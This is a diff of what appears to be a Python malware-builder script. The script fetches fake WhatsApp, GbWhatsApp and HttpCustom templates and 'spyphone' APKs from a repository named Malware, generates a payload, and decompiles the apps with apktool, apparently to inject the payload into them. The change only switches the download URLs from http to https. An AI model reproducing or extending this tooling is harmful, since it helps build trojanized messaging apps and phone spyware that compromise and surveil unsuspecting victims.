@@ -101,7 +101,7 @@ def payload():
 	
 def httpcustom():
 	os.system("cd Malware && rm -rf payload.apk payload A")
-	os.system("git clone http://github.com/PyRAT-svg/HttpCustom &&mv -f HttpCustom Malware")
+	os.system("git clone https://github.com/PyRAT-svg/HttpCustom &&mv -f HttpCustom Malware")
 	os.rename('Malware/HttpCustom', 'Malware/A')
 	payload()
 	os.system("cd Malware && apktool d payload.apk -o payload")
@@ -114,7 +114,7 @@ def httpcustom():
 
 def gbwa():
 	os.system("cd Malware && rm -rf payload.apk payload A")
-	os.system("git clone http://github.com/PyRAT-svg/GbWhatsApp &&mv -f GbWhatsApp Malware")
+	os.system("git clone https://github.com/PyRAT-svg/GbWhatsApp &&mv -f GbWhatsApp Malware")
 	os.rename('Malware/GbWhatsApp', 'Malware/A')
 	payload()
 	os.system("cd Malware && apktool d payload.apk -o payload")
@@ -128,7 +128,7 @@ def gbwa():
 		
 def wa():
 	os.system("cd Malware && rm -rf payload.apk payload A")
-	os.system("git clone http://github.com/PyRAT-svg/WhatsApp&& mv -f WhatsApp Malware")
+	os.system("git clone https://github.com/PyRAT-svg/WhatsApp&& mv -f WhatsApp Malware")
 	os.rename('Malware/WhatsApp', 'Malware/A')
 	payload()
 	os.system("cd Malware && apktool d payload.apk -o payload")
@@ -141,7 +141,7 @@ def wa():
 
 
 def spyphone_V14():
-	os.system("wget http://github.com/PyRAT-svg/Malware/raw/master/spyphone_V14.apk && mv -f spyphone_V14.apk Malware/spyphone.apk")
+	os.system("wget https://github.com/PyRAT-svg/Malware/raw/master/spyphone_V14.apk && mv -f spyphone_V14.apk Malware/spyphone.apk")
 	os.system("cd Malware && rm -rf payload.apk payload spyphone")
 	os.system("cd Malware && apktool d spyphone.apk -o spyphone")
 	os.system("rm -rf Malware/spyphone.apk")
@@ -157,7 +157,7 @@ def spyphone_V14():
 
 	
 def spyphone():
-	os.system("wget http://github.com/PyRAT-svg/Malware/raw/master/spyphone.apk && mv -f spyphone.apk Malware/spyphone.apk")
+	os.system("wget https://github.com/PyRAT-svg/Malware/raw/master/spyphone.apk && mv -f spyphone.apk Malware/spyphone.apk")
 	os.system("cd Malware && rm -rf payload.apk payload spyphone")
 	os.system("cd Malware && apktool d spyphone.apk -o spyphone")
 	os.system("rm -rf Malware/spyphone.apk")
